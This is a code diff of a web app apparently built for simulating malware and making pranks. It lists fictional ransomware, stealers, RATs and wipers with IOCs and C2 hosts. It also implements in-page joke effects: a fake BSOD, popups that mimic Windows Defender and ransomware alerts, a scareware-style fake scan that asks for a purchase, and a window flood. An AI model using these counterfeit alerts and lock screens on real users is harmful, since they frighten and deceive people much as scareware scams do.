-    cpu: '3.4%', mem: '64 MB',
-    procs: ['ghost_svc.exe','winlogon32.exe'],
-    net: ['185.234.x.x:443 (encrypted)'],
-    behavior: ['Keylogger active','Screenshot every 30s','Clipboard monitor','Webcam silent capture','Reverse shell on demand'],
-    color: '#8844ff',
-  },
-  {
-    name: 'KillDisk.exe',
-    type: 'Wiper / Destructive',
-    icon: '💣',
-    threat: 'CRITICAL',
-    os: ['Windows'],
-    size: '390 KB',
-    version: 'v2.1',
-    author: 'unknown',
-    first: '2024-12-01',
-    desc: 'Disk wiper malware that overwrites MBR, partition tables, and the first 16 sectors of every disk. No recovery possible. No ransom — purely destructive.',
-    iocs: ['\\Device\\PhysicalDrive0 (write access)','SeShutdownPrivilege'],
-    cpu: '76.3%', mem: '22 MB',
-    procs: ['killdsk.exe','dd32.exe'],
-    net: ['none (offline destructive)'],
-    behavior: ['Overwrites MBR with garbage','Wipes partition tables','Deletes all shadow copies','Corrupts boot sector','System unbootable after 30 min'],
-    color: '#ff0055',
-  },
-  {
-    name: 'MineBot.sh',
-    type: 'Cryptominer',
-    icon: '⛏️',
-    threat: 'MEDIUM',
-    os: ['Linux','Debian'],
-    size: '28 KB',
-    version: 'v4.0',
-    author: 'MineOps',
-    first: '2025-02-14',
-    desc: 'Shell script-based cryptominer dropper. Downloads XMRig and configures it to mine Monero using victim CPU at max capacity. Adds cron persistence.',
-    iocs: ['/tmp/xmrig','/etc/cron.d/sys_update','pool.xmrpool.eu:3333'],
-    cpu: '99.9%', mem: '45 MB',
-    procs: ['xmrig','sys_update.sh'],
-    net: ['pool.xmrpool.eu:3333','eu.supportxmr.com'],
-    behavior: ['Drops XMRig to /tmp','Adds cron job every minute','Kills competing miners','Throttles when top is running','Monero wallet: 4BS...xxx'],
-    color: '#ffcc00',
-  },
-  {
-    name: 'BankerX.dll',
-    type: 'Banking Trojan',
-    icon: '🏦',
-    threat: 'HIGH',
-    os: ['Windows'],
-    size: '2.1 MB',
-    version: 'v9.1',
-    author: 'FIN7-clone',
-    first: '2024-10-08',
-    desc: 'Browser-injecting banking trojan targeting 400+ financial institutions. Uses form-grabbing and webinjection to steal credentials and OTPs in real time.',
-    iocs: ['%TEMP%\\bankx_loader.dll','browser hooks in chrome.exe','registry: HKCU\\BankX'],
-    cpu: '4.2%', mem: '89 MB',
-    procs: ['chrome.exe (injected)','bankx_loader.dll'],
-    net: ['api.bankx-c2.ru:8443'],
-    behavior: ['Injects into browser process','Grabs form POST data','Intercepts OTP SMS (if modem)','Steals saved passwords','Exfils to C2 every 60s'],
-    color: '#00aaff',
-  },
+  { name:'SalienWin.exe',   type:'Ransomware',          icon:'☠️', threat:'CRITICAL', os:['Windows','Linux(Wine)'],  size:'847 KB',  v:'v3.2.1', author:'unknown',      first:'2024-11-12', desc:'Polymorphic ransomware using AES-256 to fake-encrypt user files. Communicates via fake Tor C2. Drops ransom note, sets fake autorun registry key.', iocs:['C:\\Windows\\Temp\\slwn32.exe','HKLM\\SOFTWARE\\SalienWin','FAKE.onion'],      cpu:'98.2%', mem:'487 MB', procs:['slwn32.exe','slwn_crypt.exe'],        net:['FAKE.onion:443','pastebin.com(exfil)'],      behavior:['Encrypts .doc .pdf .jpg .zip','Deletes shadow copies','Disables Defender','Drops ransom note','Kills AV'], color:'#ff3333', badge:'badge-red'  },
+  { name:'DeadBolt.py',     type:'Ransomware',          icon:'🔐', threat:'HIGH',     os:['Linux','Debian','macOS'], size:'12 KB',   v:'v1.0',   author:'APT-Ghost',     first:'2025-01-03', desc:'Python ransomware targeting NAS and servers. ChaCha20-Poly1305 encryption. Minimal footprint, drops README in every directory.', iocs:['/tmp/.db_lock','/etc/cron.d/deadbolt','port 8080'],                                  cpu:'45.1%', mem:'128 MB', procs:['python3','deadbolt.py'],              net:['193.19.x.x:8080'],                          behavior:['Targets /mnt /media /backup','Overwrites MBR','Sends key to C2','Drops README.deadbolt'], color:'#ff8800', badge:'badge-red'  },
+  { name:'GhostRAT.bin',    type:'Remote Access Trojan',icon:'👁️', threat:'HIGH',     os:['Windows','macOS'],       size:'1.2 MB',  v:'v7.4',   author:'APT-Shadow',    first:'2024-08-22', desc:'Advanced RAT with keylogging, screenshot capture, webcam access, clipboard hijack, and full remote shell over encrypted C2.', iocs:['%APPDATA%\\ghost_svc.exe','WindowsUpdateChk task'],                               cpu:'3.4%',  mem:'64 MB',  procs:['ghost_svc.exe','winlogon32.exe'],     net:['185.234.x.x:443'],                          behavior:['Keylogger','Screenshot every 30s','Clipboard monitor','Webcam capture','Reverse shell'], color:'#8844ff', badge:'badge-purple'},
+  { name:'KillDisk.exe',    type:'Wiper / Destructive', icon:'💣', threat:'CRITICAL', os:['Windows'],               size:'390 KB',  v:'v2.1',   author:'unknown',       first:'2024-12-01', desc:'Disk wiper that overwrites MBR, partition tables, and first 16 sectors of every disk. No ransom — purely destructive. No recovery.', iocs:['PhysicalDrive0 raw write','SeShutdownPrivilege'],                                  cpu:'76.3%', mem:'22 MB',  procs:['killdsk.exe','dd32.exe'],             net:['none (offline)'],                           behavior:['Overwrites MBR','Wipes partitions','Deletes shadow copies','Corrupts boot sector'], color:'#ff0055', badge:'badge-red'  },
+  { name:'MineBot.sh',      type:'Cryptominer',         icon:'⛏️', threat:'MEDIUM',   os:['Linux','Debian'],        size:'28 KB',   v:'v4.0',   author:'MineOps',       first:'2025-02-14', desc:'Shell script dropper for XMRig. Mines Monero at 99.9% CPU. Adds cron persistence, kills competing miners.', iocs:['/tmp/xmrig','/etc/cron.d/sys_update','pool.xmrpool.eu:3333'],                        cpu:'99.9%', mem:'45 MB',  procs:['xmrig','sys_update.sh'],              net:['pool.xmrpool.eu:3333'],                     behavior:['Drops XMRig','Adds cron','Kills other miners','Throttles when top is open'], color:'#ffcc00', badge:'badge-yellow'},
+  { name:'BankerX.dll',     type:'Banking Trojan',      icon:'🏦', threat:'HIGH',     os:['Windows'],               size:'2.1 MB',  v:'v9.1',   author:'FIN7-clone',    first:'2024-10-08', desc:'Browser-injecting banking trojan. Form-grabbing and webinjection targeting 400+ banks. Steals credentials and OTPs in real time.', iocs:['%TEMP%\\bankx_loader.dll','browser hooks'],                                         cpu:'4.2%',  mem:'89 MB',  procs:['chrome.exe(injected)','bankx.dll'],  net:['api.bankx-c2.example:8443'],               behavior:['Injects into browser','Grabs POST data','Intercepts OTP','Steals passwords','Exfils every 60s'], color:'#00aaff', badge:'badge-blue' },
+  { name:'WindowBomb.exe',  type:'Window Flooder',      icon:'🗂️', threat:'LOW',      os:['Windows'],               size:'4 KB',    v:'v1.0',   author:'Prankster99',   first:'2025-03-01', desc:'Opens thousands of fake windows and popups. Not destructive but renders the system unusable through sheer visual flooding.', iocs:['High GDI object count','Rapid CreateWindow calls'],                                   cpu:'22.1%', mem:'210 MB', procs:['winbomb.exe'],                        net:['none'],                                     behavior:['Spawns windows every 50ms','Titles change randomly','Plays error sounds','Fills taskbar'], color:'#ff8844', badge:'badge-yellow'},
+  { name:'CredStealer.py',  type:'Credential Stealer',  icon:'🕵️', threat:'CRITICAL', os:['Windows','macOS','Linux'],size:'34 KB', v:'v2.3',   author:'DarkNet-X',     first:'2024-09-15', desc:'Silently dumps browser saved passwords, cookies, crypto wallets, Discord tokens, Steam sessions, and Telegram data.', iocs:['%LOCALAPPDATA%\\creds_dump','Discord token grab'],                                    cpu:'2.1%',  mem:'18 MB',  procs:['cred_steal.py','python3'],            net:['webhook.discord.example','t.me/bot_exfil'], behavior:['Dumps Chrome/Firefox passwords','Steals cookies','Grabs Discord tokens','Reads .env files','Exfils via Telegram bot'], color:'#ff2266', badge:'badge-red'  },
+  { name:'SpreadWorm.exe',  type:'Network Worm',        icon:'🪱', threat:'HIGH',     os:['Windows','Linux'],       size:'180 KB',  v:'v5.0',   author:'WormNet',       first:'2024-07-04', desc:'Self-replicating worm that spreads via SMB shares, email attachments, and USB drives. Drops payload on every reachable machine.', iocs:['SMB port 445 scan','\\\\*\\IPC$ access attempts'],                                    cpu:'35.0%', mem:'78 MB',  procs:['spreadworm.exe','smb_scan.exe'],     net:['LAN sweep 192.168.x.x/24','smtp relay'],   behavior:['Scans LAN for SMB','Copies itself to shares','Mails itself','Infects USB','Drops secondary payload'], color:'#44ddff', badge:'badge-blue' },
+  { name:'BootKill.sys',    type:'Bootkit / Rootkit',   icon:'👻', threat:'CRITICAL', os:['Windows'],               size:'64 KB',   v:'v1.2',   author:'PhantomDev',    first:'2024-06-18', desc:'Kernel-level bootkit that installs into MBR/VBR. Survives OS reinstall. Hooks system calls to hide its processes and files.', iocs:['Raw MBR write','Driver signing bypass','BIOS tampering'],                            cpu:'0.5%',  mem:'8 MB',   procs:['[hidden by rootkit]'],                net:['encrypted beacon every 1h'],               behavior:['Infects MBR/VBR','Hides own processes','Intercepts system calls','Persists through reinstall','Exfils keystrokes'], color:'#886600', badge:'badge-yellow'},
+  { name:'FakeAV.exe',      type:'Scareware',           icon:'🛡️', threat:'LOW',      os:['Windows'],               size:'900 KB',  v:'v3.0',   author:'ScamLab',       first:'2025-01-20', desc:'Fake antivirus that scans and finds hundreds of "threats". Demands payment to "remove" them. Completely harmless but annoying.', iocs:['Fake scan UI','payment_page.exe','alert_loop.bat'],                                  cpu:'8.0%',  mem:'120 MB', procs:['fakeav_ui.exe','alert_loop.exe'],    net:['scampay.example:443'],                      behavior:['Fake virus scan','Red scary alerts','Nags for payment','Blocks other apps','Disables right-click'], color:'#44ff88', badge:'badge-green'},
+  { name:'CookieMonster.js',type:'Cookie / Session Stealer',icon:'🍪',threat:'HIGH',  os:['Windows','macOS','Linux'],size:'8 KB',  v:'v4.1',   author:'JS-Injector',   first:'2025-02-01', desc:'JavaScript payload injected via XSS that grabs all cookies, sessionStorage, localStorage and sends them to an attacker webhook instantly.', iocs:['Outbound JSON to external webhook','document.cookie access'],                      cpu:'0.5%',  mem:'2 MB',   procs:['browser(injected script)'],          net:['webhook.attacker.example'],                behavior:['Grabs all cookies','Reads localStorage','Sends to webhook','Hijacks active sessions','Injects keylogger'], color:'#ffaa22', badge:'badge-yellow'},
+  { name:'DDoSBot.exe',     type:'DDoS Bot / Stresser',  icon:'🔥', threat:'HIGH',    os:['Windows','Linux'],       size:'220 KB',  v:'v8.2',   author:'BotNET-Z',      first:'2024-05-12', desc:'Enrolls infected machine into a botnet for coordinated DDoS attacks. Supports HTTP flood, UDP flood, Slowloris, and DNS amplification.', iocs:['High outbound UDP/TCP','C2 IRC channel join'],                                     cpu:'90.0%', mem:'55 MB',  procs:['ddos_bot.exe','flood_udp.exe'],      net:['irc.c2.example:6667','UDP flood target'], behavior:['HTTP flood','UDP flood','Slowloris','DNS amplify','Receives C2 commands'], color:'#ff4400', badge:'badge-red'  },
 ];
 
 let selectedVirus = null;
 
 function renderVirusList() {
-  const list = document.getElementById('virus-list');
-  list.innerHTML = virusDB.map((v,i) => `
+  document.getElementById('virus-list').innerHTML = virusDB.map((v,i)=>`
     <div class="virus-item" id="vi-${i}" onclick="selectVirus(${i})">
-      <span style="font-size:24px;">${v.icon}</span>
-      <div style="flex:1;">
-        <div style="font-size:13px;font-weight:600;font-family:'JetBrains Mono',monospace;color:${v.color};">${v.name}</div>
-        <div style="font-size:11px;color:rgba(255,255,255,0.4);">${v.type}</div>
+      <span style="font-size:22px;">${v.icon}</span>
+      <div style="flex:1;min-width:0;">
+        <div style="font-size:12px;font-weight:600;font-family:'JetBrains Mono',monospace;color:${v.color};white-space:nowrap;overflow:hidden;text-overflow:ellipsis;">${v.name}</div>
+        <div style="font-size:10px;color:rgba(255,255,255,.4);">${v.type}</div>
       </div>
-      <span class="badge ${v.threat==='CRITICAL'?'badge-red':v.threat==='HIGH'?'badge-red':''}" style="${v.threat==='MEDIUM'?'color:#ffd36b;border-color:rgba(255,200,0,0.2);':''}">${v.threat}</span>
+      <span class="badge ${v.badge}" style="font-size:9px;flex-shrink:0;">${v.threat}</span>
     </div>`).join('');
 }
 
 function selectVirus(i) {
-  document.querySelectorAll('.virus-item').forEach(el => el.classList.remove('selected'));
+  document.querySelectorAll('.virus-item').forEach(el=>el.classList.remove('selected'));
   document.getElementById('vi-'+i).classList.add('selected');
-  const v = virusDB[i];
-  selectedVirus = v;
+  const v = virusDB[i]; selectedVirus = v;
 
   document.getElementById('virus-detail').innerHTML = `
-    <div style="display:flex;align-items:flex-start;gap:16px;margin-bottom:20px;">
-      <span style="font-size:52px;">${v.icon}</span>
-      <div>
+    <div style="display:flex;align-items:flex-start;gap:16px;margin-bottom:18px;flex-wrap:wrap;">
+      <span style="font-size:48px;">${v.icon}</span>
+      <div style="flex:1;min-width:200px;">
         <div style="font-size:20px;font-weight:700;font-family:'JetBrains Mono',monospace;color:${v.color};">${v.name}</div>
-        <div style="font-size:12px;color:rgba(255,255,255,0.4);margin-top:4px;">${v.type} &nbsp;|&nbsp; ${v.version} &nbsp;|&nbsp; ${v.size}</div>
+        <div style="font-size:12px;color:rgba(255,255,255,.4);margin-top:4px;">${v.type} | ${v.v} | ${v.size}</div>
         <div style="display:flex;gap:6px;margin-top:8px;flex-wrap:wrap;">
-          <span class="badge badge-red">${v.threat}</span>
+          <span class="badge ${v.badge}">${v.threat}</span>
           ${v.os.map(o=>`<span class="badge">${o}</span>`).join('')}
         </div>
       </div>
-      <div style="margin-left:auto;text-align:right;">
-        <div style="font-size:11px;color:rgba(255,255,255,0.3);">Author: ${v.author}</div>
-        <div style="font-size:11px;color:rgba(255,255,255,0.3);">First seen: ${v.first}</div>
+      <div style="text-align:right;font-size:11px;color:rgba(255,255,255,.3);">
+        <div>Author: ${v.author}</div><div>First seen: ${v.first}</div>
       </div>
     </div>
-    <p style="font-size:13px;color:rgba(255,255,255,0.6);line-height:1.7;margin-bottom:16px;">${v.desc}</p>
+    <p style="font-size:13px;color:rgba(255,255,255,.6);line-height:1.7;margin-bottom:16px;">${v.desc}</p>
     <div class="flex gap-4 flex-wrap">
-      <div style="flex:1;min-width:200px;">
-        <div class="creator-label">🔴 Indicators of Compromise</div>
-        ${v.iocs.map(ioc=>`<div style="font-size:11px;color:#ff6666;font-family:'JetBrains Mono',monospace;padding:2px 0;">• ${ioc}</div>`).join('')}
+      <div style="flex:1;min-width:180px;">
+        <div class="creator-label">🔴 IOCs</div>
+        ${v.iocs.map(x=>`<div style="font-size:11px;color:#ff6666;font-family:'JetBrains Mono',monospace;padding:2px 0;">• ${x}</div>`).join('')}
       </div>
-      <div style="flex:1;min-width:200px;">
-        <div class="creator-label">⚙️ Behavior</div>
-        ${v.behavior.map(b=>`<div style="font-size:11px;color:rgba(255,255,255,0.5);padding:2px 0;">• ${b}</div>`).join('')}
+      <div style="flex:1;min-width:180px;">
+        <div class="creator-label">⚙️ Behaviors</div>
+        ${v.behavior.map(b=>`<div style="font-size:11px;color:rgba(255,255,255,.5);padding:2px 0;">• ${b}</div>`).join('')}
       </div>
-      <div style="flex:1;min-width:200px;">
+      <div style="flex:1;min-width:180px;">
         <div class="creator-label">🌐 Network</div>
         ${v.net.map(n=>`<div style="font-size:11px;color:#ffd36b;font-family:'JetBrains Mono',monospace;padding:2px 0;">• ${n}</div>`).join('')}
       </div>
     </div>
     <div style="margin-top:16px;display:flex;gap:8px;flex-wrap:wrap;">
-      <button class="btn-gen btn-danger" style="padding:8px 18px;font-size:12px;" onclick="simulateVirus()">🚀 Simulate in Sandbox</button>
-      <button class="btn-gen" style="padding:8px 18px;font-size:12px;" onclick="analyzeVirus()">🔬 Analyze</button>
-      <button class="btn-gen" style="padding:8px 18px;font-size:12px;" onclick="useAsLocker()">🔒 Use as WinLocker Base</button>
+      <button class="btn-gen btn-danger" style="padding:8px 18px;font-size:12px;" onclick="simulateVirus()">🚀 Simulate</button>
+      <button class="btn-gen" style="padding:8px 18px;font-size:12px;" onclick="useAsLocker()">🔒 Load as Locker</button>
     </div>`;
 
   renderProcessTable(v);
@@ -1543,68 +1150,457 @@ function simulateVirus() {
   if(!selectedVirus) return;
   showPage('sandbox');
   showNotif(`Simulating ${selectedVirus.name}...`, selectedVirus.icon);
-  setTimeout(() => infectSandbox(), 500);
-}
-
-function analyzeVirus() {
-  if(!selectedVirus) return;
-  const v = selectedVirus;
-  addNetLog(`ANALYSIS: ${v.name} — scanning behavior signature...`, 'warn');
-  addActivityLog(`[ANALYZE] ${v.name} — ${v.type} — CPU:${v.cpu} MEM:${v.mem}`, 'warn');
-  showNotif(`Analysis started: ${v.name}`, '🔬');
+  setTimeout(infectSandbox, 500);
 }
 
 function useAsLocker() {
   if(!selectedVirus) return;
   const v = selectedVirus;
   document.getElementById('cfg-virusname').value = v.name;
-  document.getElementById('cfg-title').value = `⚠️ ${v.name.toUpperCase()} HAS ENCRYPTED YOUR FILES`;
+  document.getElementById('cfg-title').value = `⚠️ ${v.name.toUpperCase()} DETECTED`;
   document.getElementById('cfg-msg').value = v.desc;
   document.getElementById('cfg-icon').value = v.icon;
   showPage('creator');
-  setTimeout(() => buildLocker(), 200);
+  setTimeout(buildLocker, 200);
   showNotif(`${v.name} loaded into creator!`, v.icon);
 }
 
 function renderProcessTable(v) {
-  const defaultProcs = [
-    ['System Idle','0','0.0%','0.1 MB','Running',''],
-    ['explorer.exe','1024','1.2%','34 MB','Running',''],
-    ['svchost.exe','512','0.5%','22 MB','Running',''],
-    ['csrss.exe','388','0.0%','2.3 MB','Running',''],
-    ['winlogon.exe','480','0.0%','5.1 MB','Running',''],
-    ['lsass.exe','500','0.1%','8.2 MB','Running',''],
-  ];
-  const virusProcs = v ? v.procs.map(p => [p, String(Math.floor(Math.random()*9000)+1000), v.cpu, v.mem, 'RUNNING ⚠️', 'err']) : [];
-  const allProcs = [...virusProcs, ...defaultProcs];
-
-  document.getElementById('process-table').innerHTML = allProcs.map(([name,pid,cpu,mem,status,cls]) => `
-    <tr style="border-bottom:1px solid rgba(255,255,255,0.03);${cls==='err'?'background:rgba(255,0,0,0.05);':''}">
-      <td style="padding:6px 12px;color:${cls==='err'?'#ff6666':'#e0e0e0'};font-family:'JetBrains Mono',monospace;">${name}</td>
-      <td style="padding:6px;color:rgba(255,255,255,0.5);">${pid||Math.floor(Math.random()*9000)+100}</td>
-      <td style="padding:6px;color:${cls==='err'?'#ff6666':'rgba(255,255,255,0.6)'};">${cpu}</td>
-      <td style="padding:6px;color:rgba(255,255,255,0.6);">${mem}</td>
-      <td style="padding:6px;"><span class="badge ${cls==='err'?'badge-red':'badge-green'}" style="font-size:9px;">${status}</span></td>
+  const base = [['System Idle','0','0.0%','0.1 MB',''],['explorer.exe','1024','1.2%','34 MB',''],['svchost.exe','512','0.5%','22 MB',''],['csrss.exe','388','0.0%','2.3 MB','']];
+  const vp = v ? v.procs.map(p=>[p, String(Math.floor(Math.random()*8000)+1000), v.cpu, v.mem, 'err']) : [];
+  document.getElementById('process-table').innerHTML = [...vp.map(([n,p,c,m,cls])=>[n,p,c,m,cls]), ...base.map(([n,p,c,m])=>[n,p,c,m,''])].map(([n,p,c,m,cls])=>`
+    <tr style="border-bottom:1px solid rgba(255,255,255,.03);${cls==='err'?'background:rgba(255,0,0,.05);':''}">
+      <td style="padding:6px 12px;color:${cls==='err'?'#ff6666':'#e0e0e0'};font-family:'JetBrains Mono',monospace;font-size:11px;">${n}</td>
+      <td style="padding:6px;color:rgba(255,255,255,.5);font-size:11px;">${p}</td>
+      <td style="padding:6px;color:${cls==='err'?'#ff6666':'rgba(255,255,255,.6)'};font-size:11px;">${c}</td>
+      <td style="padding:6px;color:rgba(255,255,255,.6);font-size:11px;">${m}</td>
+      <td style="padding:6px;font-size:11px;"><span class="badge ${cls==='err'?'badge-red':'badge-green'}" style="font-size:9px;">${cls==='err'?'⚠️ ACTIVE':'Running'}</span></td>
     </tr>`).join('');
 }
 
-// Animate process CPU values
-setInterval(() => {
-  const rows = document.querySelectorAll('#process-table tr');
-  rows.forEach(row => {
-    const cells = row.querySelectorAll('td');
-    if(cells.length && cells[2] && !cells[0].textContent.includes('Idle')) {
-      const val = parseFloat(cells[2].textContent);
-      if(!isNaN(val)) {
-        const jitter = (Math.random()-0.5)*0.5;
-        cells[2].textContent = Math.max(0, Math.min(99.9, val+jitter)).toFixed(1)+'%';
-      }
-    }
+setInterval(()=>{
+  document.querySelectorAll('#process-table tr td:nth-child(3)').forEach(td=>{
+    const v = parseFloat(td.textContent);
+    if(!isNaN(v) && v > 0.1) td.textContent = Math.max(0, Math.min(99.9, v+(Math.random()-.5)*.6)).toFixed(1)+'%';
   });
-}, 1500);
+}, 1600);
 
-// Build locker on load
-buildLocker();
+// Net monitor cycling
+const netMsgs = [
+  ['eth0 → 8.8.8.8 (DNS query)','out'],
+  ['eth0 → 142.250.x.x (HTTPS)','out'],
+  ['eth0 → 192.168.1.1 (ARP)','out'],
+  ['OUTBOUND: encrypted beacon detected!','err'],
+  ['eth0 → FAKE.onion:443 (C2 ping)','err'],
+];
+let nmIdx=0;
+setInterval(()=>{
+  const nm = document.getElementById('net-monitor');
+  if(!nm) return;
+  const [msg,cls] = netMsgs[nmIdx%netMsgs.length]; nmIdx++;
+  const d=document.createElement('div');
+  d.innerHTML=`<span class="${cls}">[${new Date().toLocaleTimeString()}] ${msg}</span>`;
+  nm.insertBefore(d, nm.lastElementChild);
+  nm.scrollTop=nm.scrollHeight;
+}, 3200);
+
+// ─────────────────────────────────────────
+//  JOKE VIRUSES
+// ─────────────────────────────────────────
+
+// — BSOD —
+function runBSOD() {
+  const bsod = document.getElementById('bsod');
+  bsod.style.display = 'block';
+  let pct = 0;
+  document.getElementById('bsod-pct').textContent = '0';
+  const iv = setInterval(()=>{
+    pct += Math.floor(Math.random()*4)+1;
+    if(pct>=100){ pct=100; clearInterval(iv);
+      document.getElementById('bsod-collecting').textContent = '*** Physical memory dump complete. ***'; }
+    document.getElementById('bsod-pct').textContent = pct;
+  },120);
+  jTerm('BSoD.exe — Blue Screen of Death activated','err');
+  showNotif('💙 BSOD activated!','💙');
+}
+
+// — POPUP STORM —
+let popupStormInterval = null;
+let popupCount = 0;
+const popupMsgs = [
+  {icon:'⚠️', title:'Windows Security Alert', msg:'A virus has been detected on your computer!\nSalienWin.exe is stealing your files RIGHT NOW.', btn:'OK'},
+  {icon:'❌', title:'Critical Error', msg:'FATAL_ERROR: Memory corruption detected.\nYour hard drive may be damaged.', btn:'OK'},
+  {icon:'🔒', title:'Access Denied', msg:'You do not have permission to access\nC:\\System32\\kernel.dll', btn:'Close'},
+  {icon:'⚠️', title:'Windows Defender', msg:'Threat Found: Trojan.Win32.SalienWin\nStatus: ACTIVE — Unable to remove', btn:'Dismiss'},
+  {icon:'💀', title:'SalienWin.exe', msg:'Your files are being encrypted...\nDo NOT turn off your computer.', btn:'OK'},
+  {icon:'🔥', title:'System Failure', msg:'CPU temperature critical: 127°C\nShutdown recommended immediately.', btn:'Ignore'},
+  {icon:'❌', title:'Disk Error', msg:'Disk read error on C:\\\nData may be lost. Run CHKDSK immediately.', btn:'OK'},
+  {icon:'⚠️', title:'Network Alert', msg:'Unknown device connected to your network.\nIP: 192.168.1.105 — UNKNOWN', btn:'Close'},
+];
+function startPopupStorm() {
+  if(popupStormInterval) return;
+  jTerm('PopupStorm.exe — spawning endless popups...','err');
+  showNotif('💥 Popup storm started!','💥');
+  popupStormInterval = setInterval(()=>{
+    if(popupCount > 60) return; // limit to avoid real browser issues
+    const m = popupMsgs[Math.floor(Math.random()*popupMsgs.length)];
+    spawnPopup(m.icon, m.title, m.msg, m.btn);
+    popupCount++;
+  }, 400);
+}
+function stopPopupStorm() {
+  clearInterval(popupStormInterval); popupStormInterval=null; popupCount=0;
+  document.querySelectorAll('.popup-win').forEach(el=>el.remove());
+  jTerm('PopupStorm.exe — stopped and cleared','ok');
+  showNotif('Popup storm stopped','🧹');
+}
+function spawnPopup(icon, title, msg, btn) {
+  const x = Math.random()*(window.innerWidth-320);
+  const y = Math.random()*(window.innerHeight-160)+60;
+  const id = 'popup-'+Date.now()+Math.random();
+  const el = document.createElement('div');
+  el.className='popup-win'; el.id=id;
+  el.style.left=x+'px'; el.style.top=y+'px';
+  el.innerHTML=`
+    <div class="popup-title" onmousedown="dragPopup(event,'${id}')">
+      <span>🖥️ ${title}</span>
+      <button class="close-x" onclick="document.getElementById('${id}').remove()">✕</button>
+    </div>
+    <div class="popup-body">
+      <div class="popup-icon">${icon}</div>
+      <div class="popup-text" style="white-space:pre-line;">${msg}</div>
+    </div>
+    <div class="popup-btns">
+      <button class="popup-btn" onclick="document.getElementById('${id}').remove()">${btn}</button>
+      <button class="popup-btn" onclick="document.getElementById('${id}').remove()">Cancel</button>
+    </div>`;
+  document.body.appendChild(el);
+}
+function dragPopup(e, id) {
+  const el = document.getElementById(id);
+  if(!el) return;
+  let sx=e.clientX-el.offsetLeft, sy=e.clientY-el.offsetTop;
+  const move=ev=>{el.style.left=Math.max(0,ev.clientX-sx)+'px';el.style.top=Math.max(0,ev.clientY-sy)+'px';};
+  const up=()=>{document.removeEventListener('mousemove',move);document.removeEventListener('mouseup',up);};
+  document.addEventListener('mousemove',move); document.addEventListener('mouseup',up);
+}
+
+// — MATRIX —
+let matrixAnimFrame=null;
+function startMatrix() {
+  const canvas=document.getElementById('matrix-canvas');
+  const btn=document.getElementById('matrix-close');
+  canvas.style.display='block'; btn.style.display='block';
+  canvas.width=window.innerWidth; canvas.height=window.innerHeight;
+  const ctx=canvas.getContext('2d');
+  const cols=Math.floor(canvas.width/16); const drops=Array(cols).fill(1);
+  jTerm('MatrixRain.sh — entering the matrix...','ok');
+  showNotif('🟩 Matrix rain started!','🟩');
+  function draw(){
+    ctx.fillStyle='rgba(0,0,0,.05)'; ctx.fillRect(0,0,canvas.width,canvas.height);
+    ctx.fillStyle='#0f0'; ctx.font='15px monospace';
+    drops.forEach((y,i)=>{
+      const ch=String.fromCharCode(0x30A0+Math.random()*96);
+      ctx.fillText(ch,i*16,y*16);
+      if(y*16>canvas.height && Math.random()>.975) drops[i]=0;
+      drops[i]++;
+    });
+    matrixAnimFrame=requestAnimationFrame(draw);
+  }
+  draw();
+}
+function stopMatrix(){
+  const canvas=document.getElementById('matrix-canvas');
+  const btn=document.getElementById('matrix-close');
+  cancelAnimationFrame(matrixAnimFrame); matrixAnimFrame=null;
+  canvas.style.display='none'; btn.style.display='none';
+  jTerm('MatrixRain.sh — exited','ok');
+}
+
+// — SHAKE —
+function runShake(){
+  document.body.classList.add('shaking');
+  jTerm('EarthQuake.exe — shaking everything...','warn');
+  showNotif('📳 EARTHQUAKE!','📳');
+  setTimeout(()=>document.body.classList.remove('shaking'),2500);
+}
+
+// — FAKE SCAN —
+function runFakeScan(){
+  const threats=['Trojan.SalienWin.A','Spyware.KeyLogger.XZ','Rootkit.PhantomDrive','Worm.SMBCrawler.B','Virus.Polymorphic.Q7','Backdoor.GhostRAT.V4','Adware.PopupFactory','Ransomware.DeadBolt.2'];
+  let html=`<div class="popup-win" id="fakescan" style="left:50%;top:50%;transform:translate(-50%,-50%);width:420px;z-index:999999;">
+    <div class="popup-title"><span>🛡️ VirusShield Pro — System Scan</span><button class="close-x" onclick="document.getElementById('fakescan').remove()">✕</button></div>
+    <div style="padding:14px 16px;color:#000;">
+      <div style="font-weight:bold;font-size:13px;margin-bottom:8px;">Scanning your system for threats...</div>
+      <div style="background:#000;height:16px;border:1px solid #888;margin-bottom:10px;position:relative;">
+        <div id="scan-bar" style="background:#0f0;height:100%;width:0%;transition:width .1s;"></div>
+      </div>
+      <div id="scan-status" style="font-size:11px;color:#600;font-family:monospace;">Initializing...</div>
+      <div id="scan-results" style="font-size:11px;font-family:monospace;margin-top:10px;max-height:180px;overflow-y:auto;border:1px solid #ccc;padding:6px;background:#fffef0;"></div>
+    </div>
+    <div class="popup-btns"><button class="popup-btn" onclick="document.getElementById('fakescan').remove()">Abort</button></div>
+  </div>`;
+  document.body.insertAdjacentHTML('beforeend',html);
+  const bar=document.getElementById('scan-bar');
+  const status=document.getElementById('scan-status');
+  const results=document.getElementById('scan-results');
+  let pct=0, found=0;
+  const iv=setInterval(()=>{
+    pct+=Math.random()*3+0.5;
+    if(pct>100) pct=100;
+    bar.style.width=pct+'%';
+    if(pct<30) bar.style.background='#0f0';
+    else if(pct<70) bar.style.background='#ff0';
+    else bar.style.background='#f00';
+    if(Math.random()<0.12 && pct<95){
+      const t=threats[Math.floor(Math.random()*threats.length)];
+      found++;
+      results.innerHTML+=`<span style="color:#900">⚠ THREAT: ${t} — C:\\Users\\Victim\\AppData\\${Math.random().toString(36).slice(2,8)}.exe</span><br>`;
+      results.scrollTop=results.scrollHeight;
+      status.textContent=`Found ${found} threat${found>1?'s':''}! Scanning...`;
+    } else {
+      status.textContent=`Scanning C:\\Users\\Victim\\ (${Math.floor(pct)}%)...`;
+    }
+    if(pct>=100){
+      clearInterval(iv);
+      status.innerHTML=`<span style="color:#900;font-weight:bold;">SCAN COMPLETE — ${found} THREATS DETECTED!</span>`;
+      bar.style.background='#f00';
+      results.innerHTML+=`<span style="color:#900;font-weight:bold;"><br>⛔ ${found} threats found! Your PC is at risk!<br>Purchase VirusShield PRO to remove them!</span>`;
+    }
+  },80);
+  jTerm('FakeScan.exe — scanning for fake threats...','warn');
+  showNotif('🔍 Fake virus scan started!','🔍');
+}
+
+// — WINDOW FLOOD —
+let floodInterval=null; let floodWins=[];
+const floodTitles=['SalienWin.exe','Error','Warning','VIRUS ALERT','Notepad','Calculator','Windows Security','Your PC is infected!','DO NOT CLOSE','cmd.exe','regedit','Task Manager'];
+function startWindowFlood(){
+  if(floodInterval) return;
+  jTerm('WindowFlood.exe — flooding with windows...','err');
+  showNotif('🗂️ Window flood started!','🗂️');
+  floodInterval=setInterval(()=>{
+    if(floodWins.length>120){stopWindowFlood();return;}
